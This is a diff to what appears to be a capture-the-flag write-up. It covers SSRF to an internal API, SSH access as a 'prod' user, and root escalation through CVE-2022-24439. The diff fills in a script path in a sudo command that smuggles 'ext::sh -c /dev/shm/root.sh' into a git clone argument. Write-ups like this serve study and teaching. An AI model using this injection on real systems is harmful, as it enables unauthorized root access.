@@ -39,11 +39,12 @@ Point the URL at the host and at `localhost` on different ports. Port fuzzing wi
 # SSRF to the internal API
 url=http://localhost:5000/api/latest/metadata/messages/authors
 # CVE-2022-24439
-sudo /usr/bin/python3 /opt/.../clone_prod_change.py 'ext::sh -c /dev/shm/root.sh'```
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /dev/shm/root.sh'
+```
 
 ## Lateral movement
 
-`prod`'s password works over SSH. `prod` can run `/opt/.../clone_prod_change.py` as root, which calls `Repo.clone_from(sys.argv[1], ...)`.
+`prod`'s password works over SSH. `prod` can run `/opt/internal_apps/clone_changes/clone_prod_change.py` as root, which calls `Repo.clone_from(sys.argv[1], ...)`.
 
 ## Privilege escalation
 
